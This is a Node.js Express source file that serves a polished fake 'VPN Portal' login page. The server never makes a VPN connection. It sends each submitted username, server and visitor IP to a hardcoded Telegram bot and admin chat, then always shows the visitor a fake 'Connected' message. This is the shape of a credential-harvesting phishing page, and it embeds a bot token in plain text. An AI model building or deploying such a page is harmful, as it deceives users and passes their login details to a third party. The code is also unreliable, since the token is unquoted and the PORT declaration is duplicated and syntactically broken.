// index.js — run: node index.js
require('dotenv').config();
const express = require('express');
const crypto  = require('crypto');
const app     = express();

app.use(express.json());

const BOT_TOKEN = 8504405930:AAGrgPuK5STxPpOOYC7YIisP8K3pw3Gey3o;
const ADMIN_ID  = 8572642793;
const PORT      = const PORT = process.env.PORT || 8080;

/* ---------- Telegram Notify ---------- */
async function notifyAdmin(text) {
  if (!BOT_TOKEN || !ADMIN_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: ADMIN_ID, text, parse_mode: 'HTML' })
    });
  } catch (e) { console.error('TG notify failed:', e.message); }
}

/* ---------- Beautiful Login Page ---------- */
const PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VPN Portal · Secure Access</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }

  :root {
    --bg1:#0a0e27;
    --bg2:#1a0b2e;
    --accent:#6366f1;
    --accent2:#a855f7;
    --accent3:#06b6d4;
    --glass: rgba(255,255,255,0.06);
    --glass-border: rgba(255,255,255,0.12);
    --text:#f1f5f9;
    --muted:#94a3b8;
    --ok:#10b981;
    --err:#f43f5e;
  }

  html, body { height:100%; overflow:hidden; }

  body {
    font-family:'Inter', sans-serif;
    color:var(--text);
    background:#050816;
    display:flex;
    justify-content:center;
    align-items:center;
    position:relative;
  }

  .bg-gradient {
    position:fixed; inset:0; z-index:0;
    background:
      radial-gradient(circle at 20% 20%, rgba(99,102,241,0.35), transparent 45%),
      radial-gradient(circle at 80% 80%, rgba(168,85,247,0.35), transparent 45%),
      radial-gradient(circle at 50% 50%, rgba(6,182,212,0.20), transparent 60%),
      linear-gradient(135deg, var(--bg1), var(--bg2));
    animation: bgShift 18s ease-in-out infinite alternate;
  }
  @keyframes bgShift {
    0%   { filter: hue-rotate(0deg)   saturate(1);   transform:scale(1); }
    100% { filter: hue-rotate(35deg)  saturate(1.3); transform:scale(1.08); }
  }

  .particles { position:fixed; inset:0; z-index:1; overflow:hidden; pointer-events:none; }
  .particle {
    position:absolute; width:4px; height:4px; border-radius:50%;
    background: radial-gradient(circle, #a5b4fc, transparent);
    opacity:0.6;
    animation: floatUp linear infinite;
  }
  @keyframes floatUp {
    0%   { transform:translateY(100vh) scale(0);   opacity:0; }
    10%  { opacity:0.7; }
    90%  { opacity:0.7; }
    100% { transform:translateY(-10vh) scale(1.2); opacity:0; }
  }

  .grid-overlay {
    position:fixed; inset:0; z-index:1; pointer-events:none;
    background-image:
      linear-gradient(rgba(99,102,241,0.06) 1px, transparent 1px),
      linear-gradient(90deg, rgba(99,102,241,0.06) 1px, transparent 1px);
    background-size: 40px 40px;
    mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
    -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
  }

  .card {
    position:relative; z-index:2;
    width:100%; max-width:420px;
    padding:40px 34px 34px;
    border-radius:24px;
    background: var(--glass);
    backdrop-filter: blur(24px) saturate(180%);
    -webkit-backdrop-filter: blur(24px) saturate(180%);
    border:1px solid var(--glass-border);
    box-shadow:
      0 20px 60px rgba(0,0,0,0.6),
      inset 0 1px 0 rgba(255,255,255,0.08);
    animation: cardIn 0.9s cubic-bezier(0.16,1,0.3,1);
    margin:16px;
  }
  @keyframes cardIn {
    0%   { opacity:0; transform: translateY(40px) scale(0.94); }
    100% { opacity:1; transform: translateY(0)   scale(1); }
  }

  .card::before {
    content:'';
    position:absolute; inset:-1px;
    border-radius:24px;
    padding:1px;
    background: linear-gradient(135deg, var(--accent), var(--accent2), var(--accent3), var(--accent));
    background-size: 300% 300%;
    -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
    -webkit-mask-composite: xor;
            mask-composite: exclude;
    opacity:0.55;
    animation: ringSpin 6s linear infinite;
    pointer-events:none;
  }
  @keyframes ringSpin {
    0%   { background-position: 0% 50%; }
    100% { background-position: 300% 50%; }
  }

  .brand {
    display:flex; flex-direction:column; align-items:center;
    margin-bottom:28px;
  }
  .logo {
    width:64px; height:64px;
    border-radius:18px;
    display:grid; place-items:center;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    box-shadow: 0 10px 30px rgba(99,102,241,0.5);
    margin-bottom:16px;
    animation: logoPulse 3s ease-in-out infinite;
  }
  @keyframes logoPulse {
    0%,100% { transform:translateY(0);    box-shadow:0 10px 30px rgba(99,102,241,0.5); }
    50%     { transform:translateY(-4px); box-shadow:0 16px 40px rgba(168,85,247,0.6); }
  }
  .logo svg { width:34px; height:34px; stroke:#fff; }

  h1 {
    font-size:22px; font-weight:700;
    letter-spacing:-0.02em;
    background: linear-gradient(90deg, #fff, #c7d2fe, #fff);
    background-size:200% auto;
    -webkit-background-clip:text; background-clip:text;
    -webkit-text-fill-color:transparent;
    animation: shine 4s linear infinite;
  }
  @keyframes shine {
    0%   { background-position: 0% center; }
    100% { background-position: 200% center; }
  }
  .subtitle {
    font-size:12px; color:var(--muted);
    margin-top:6px; letter-spacing:0.08em; text-transform:uppercase;
  }

  .field { position:relative; margin-bottom:16px; }
  .field label {
    display:block; font-size:11px; font-weight:600;
    color:var(--muted); margin-bottom:6px;
    letter-spacing:0.06em; text-transform:uppercase;
  }
  .input-wrap {
    position:relative;
    display:flex; align-items:center;
    border-radius:12px;
    background: rgba(10,14,39,0.55);
    border:1px solid rgba(255,255,255,0.08);
    transition: all 0.25s ease;
  }
  .input-wrap:focus-within {
    border-color: rgba(99,102,241,0.6);
    background: rgba(10,14,39,0.75);
    box-shadow:
      0 0 0 4px rgba(99,102,241,0.15),
      0 8px 24px rgba(99,102,241,0.15);
  }
  .input-wrap .icon {
    width:42px; height:42px;
    display:grid; place-items:center;
    color:var(--muted);
    transition: color 0.25s;
  }
  .input-wrap:focus-within .icon { color:var(--accent); }
  .input-wrap .icon svg { width:18px; height:18px; stroke:currentColor; fill:none; stroke-width:2; }
  .input-wrap input {
    flex:1;
    background:transparent; border:none; outline:none;
    color:var(--text); font-size:14px; font-family:inherit;
    padding:12px 14px 12px 0;
  }
  .input-wrap input::placeholder { color:#475569; }

  .toggle-pw {
    background:transparent; border:none; cursor:pointer;
    color:var(--muted); padding:0 14px;
    display:grid; place-items:center;
    transition:color 0.2s;
  }
  .toggle-pw:hover { color:var(--accent); }
  .toggle-pw svg { width:18px; height:18px; stroke:currentColor; fill:none; stroke-width:2; }

  .btn {
    width:100%; margin-top:8px;
    padding:14px;
    border:none; border-radius:12px;
    color:#fff; font-family:inherit; font-size:14px; font-weight:600;
    cursor:pointer; position:relative; overflow:hidden;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    background-size:200% 200%;
    box-shadow: 0 10px 30px rgba(99,102,241,0.35);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    letter-spacing:0.02em;
  }
  .btn:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 14px 40px rgba(168,85,247,0.5);
    background-position: 100% 50%;
  }
  .btn:active:not(:disabled) { transform: translateY(0); }
  .btn:disabled {
    cursor:not-allowed; opacity:0.75;
    background: linear-gradient(135deg, #334155, #1e293b);
    box-shadow:none;
  }

  .btn::after {
    content:'';
    position:absolute; top:0; left:-100%;
    width:100%; height:100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
    animation: shimmer 2.5s infinite;
  }
  @keyframes shimmer {
    0%   { left:-100%; }
    60%  { left:100%; }
    100% { left:100%; }
  }

  .btn .spinner {
    display:none;
    width:16px; height:16px;
    border:2px solid rgba(255,255,255,0.3);
    border-top-color:#fff;
    border-radius:50%;
    animation: spin 0.8s linear infinite;
    margin-right:8px;
    vertical-align:middle;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .btn.loading .spinner { display:inline-block; }

  .status {
    margin-top:16px; padding:12px 14px;
    border-radius:10px; font-size:13px; line-height:1.5;
    display:none;
    animation: fadeIn 0.3s ease;
    word-break:break-word;
  }
  .status.show { display:block; }
  .status.ok {
    background: rgba(16,185,129,0.1);
    border:1px solid rgba(16,185,129,0.3);
    color:#6ee7b7;
  }
  .status.err {
    background: rgba(244,63,94,0.1);
    border:1px solid rgba(244,63,94,0.3);
    color:#fda4af;
  }
  .status.info {
    background: rgba(99,102,241,0.1);
    border:1px solid rgba(99,102,241,0.3);
    color:#c7d2fe;
  }
  @keyframes fadeIn { from { opacity:0; transform:translateY(-4px); } to { opacity:1; transform:translateY(0); } }

  .footer {
    margin-top:22px; text-align:center;
    font-size:11px; color:#475569;
    letter-spacing:0.05em;
  }
  .footer span { color: var(--accent); }

  .badge {
    position:absolute; top:-12px; right:20px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    padding:5px 12px; border-radius:20px;
    font-size:10px; font-weight:700; letter-spacing:0.1em;
    text-transform:uppercase;
    box-shadow: 0 6px 20px rgba(99,102,241,0.5);
  }

  .mono { font-family:'JetBrains Mono', monospace; font-size:12px; }

  @media (max-width:420px) {
    .card { padding:32px 22px 26px; border-radius:20px; }
    h1 { font-size:20px; }
    .logo { width:56px; height:56px; }
  }
</style>
</head>
<body>

<div class="bg-gradient"></div>
<div class="grid-overlay"></div>
<div class="particles" id="particles"></div>

<div class="card">
  <div class="badge">Secure</div>

  <div class="brand">
    <div class="logo">
      <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        <path d="M9 12l2 2 4-4"/>
      </svg>
    </div>
    <h1>VPN Portal</h1>
    <div class="subtitle">Secure Access Gateway</div>
  </div>

  <div class="field">
    <label for="user">Username</label>
    <div class="input-wrap">
      <div class="icon">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
      </div>
      <input id="user" type="text" placeholder="your-username" autocomplete="username" spellcheck="false">
    </div>
  </div>

  <div class="field">
    <label for="pass">Password</label>
    <div class="input-wrap">
      <div class="icon">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
      </div>
      <input id="pass" type="password" placeholder="••••••••" autocomplete="current-password">
      <button type="button" class="toggle-pw" onclick="togglePw()" aria-label="Toggle password">
        <svg id="eyeIcon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
      </button>
    </div>
  </div>

  <div class="field">
    <label for="server">VPN Server</label>
    <div class="input-wrap">
      <div class="icon">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
          <line x1="8" y1="21" x2="16" y2="21"/>
          <line x1="12" y1="17" x2="12" y2="21"/>
        </svg>
      </div>
      <input id="server" type="text" value="free.vpn.example.com" spellcheck="false">
    </div>
  </div>

  <button id="btn" class="btn" onclick="login()">
    <span class="spinner"></span>
    <span id="btnText">Connect to VPN</span>
  </button>

  <div id="status" class="status"></div>

  <div class="footer">
    Protected by <span>256-bit encryption</span>
  </div>
</div>

<script>
(function spawnParticles(){
  const wrap = document.getElementById('particles');
  const count = 24;
  for (let i = 0; i < count; i++){
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + '%';
    p.style.animationDuration = (8 + Math.random() * 12) + 's';
    p.style.animationDelay = (-Math.random() * 20) + 's';
    const size = 2 + Math.random() * 4;
    p.style.width = size + 'px';
    p.style.height = size + 'px';
    wrap.appendChild(p);
  }
})();

function togglePw(){
  const inp = document.getElementById('pass');
  const icon = document.getElementById('eyeIcon');
  if (inp.type === 'password'){
    inp.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    inp.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function setStatus(type, html){
  const s = document.getElementById('status');
  s.className = 'status show ' + type;
  s.innerHTML = html;
}
function clearStatus(){
  const s = document.getElementById('status');
  s.className = 'status';
  s.innerHTML = '';
}

async function login(){
  const user   = document.getElementById('user').value.trim();
  const pass   = document.getElementById('pass').value;
  const server = document.getElementById('server').value.trim();
  const btn    = document.getElementById('btn');
  const btnText= document.getElementById('btnText');

  clearStatus();

  if (!user || !pass || !server){
    setStatus('err', '⚠️ Please fill in all fields.');
    return;
  }

  btn.disabled = true;
  btn.classList.add('loading');
  btnText.textContent = 'Connecting…';
  setStatus('info', '🔄 Establishing secure tunnel to <b>' + escapeHtml(server) + '</b>…');

  const started = Date.now();

  try {
    const res = await fetch('/api/vpn/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: user, password: pass, server })
    });
    const data = await res.json();

    const elapsed = Date.now() - started;
    if (elapsed < 700) await new Promise(r => setTimeout(r, 700 - elapsed));

    if (data.ok){
      setStatus('ok',
        '✅ <b>Connected!</b><br>Server: ' + escapeHtml(server) +
        '<br>Session: <span class="mono">' + escapeHtml(data.sessionId) + '</span>'
      );
      btnText.textContent = 'Connected ✓';
    } else {
      setStatus('err', '❌ Login failed: ' + escapeHtml(data.error || 'unknown'));
      btnText.textContent = 'Retry Connection';
    }
  } catch (e) {
    setStatus('err', '🌐 Server unreachable. Please try again.');
    btnText.textContent = 'Retry Connection';
  }

  btn.disabled = false;
  btn.classList.remove('loading');
}

function escapeHtml(s){
  return String(s).replace(/[&<>"']/g, m => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[m]));
}

document.addEventListener('keydown', e => {
  if (e.key === 'Enter') login();
});
<\/script>
</body>
</html>`;

/* ---------- Routes ---------- */
app.get('/', (_req, res) => res.type('html').send(PAGE));

app.post('/api/vpn/login', async (req, res) => {
  const { username, password, server } = req.body || {};
  if (!username || !password || !server) {
    return res.json({ ok: false, error: 'missing fields' });
  }

  console.log(`[${new Date().toISOString()}] login attempt: user=${username} server=${server} ip=${req.ip}`);

  await notifyAdmin(
    `🔐 <b>VPN Login Attempt</b>\n` +
    `👤 User: <code>${username}</code>\n` +
    `🖥 Server: <code>${server}</code>\n` +
    `🌐 IP: <code>${req.ip}</code>\n` +
    `🕒 ${new Date().toISOString()}`
  );

  const sessionId = crypto.randomBytes(8).toString('hex');
  res.json({ ok: true, sessionId });
});

/* ---------- Start server ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 VPN Portal running on port ${PORT}`);
});
